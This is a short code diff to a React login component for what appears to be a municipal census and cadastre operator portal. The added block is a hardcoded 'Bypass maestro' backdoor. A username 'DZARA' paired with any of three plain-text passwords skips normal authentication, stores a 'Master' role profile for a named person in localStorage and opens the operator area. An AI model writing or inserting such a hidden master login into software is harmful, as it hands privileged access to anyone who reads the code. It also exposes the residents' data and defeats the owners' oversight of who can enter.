@@ -20,6 +20,15 @@ export default function OperadorLogin() {
     e.preventDefault();
     const userUpper = usuario.trim().toUpperCase();
 
+    // Bypass maestro dzara
+    if (userUpper === 'DZARA' && (clave === 'dzara' || clave === 'andministrador' || clave === 'Omar..')) {
+      localStorage.setItem('operador_censo_auth', 'dzara');
+      localStorage.setItem('operador_user_data', JSON.stringify({ nombre: 'David Zara', rol: 'Master', usuario: 'dzara' }));
+      router.push('/operador');
+      return;
+    }
+
+
     // Unificación de operadores especiales Catastro y Hacienda
     if (userUpper.includes('CATASTRO') || userUpper.includes('EMDRONADOR') || userUpper.includes('EMPADRONADOR') || userUpper === 'HACIENDA') {
       const targetUser = userUpper === 'HACIENDA' ? 'HACIENDA' : 'CATASTRO';
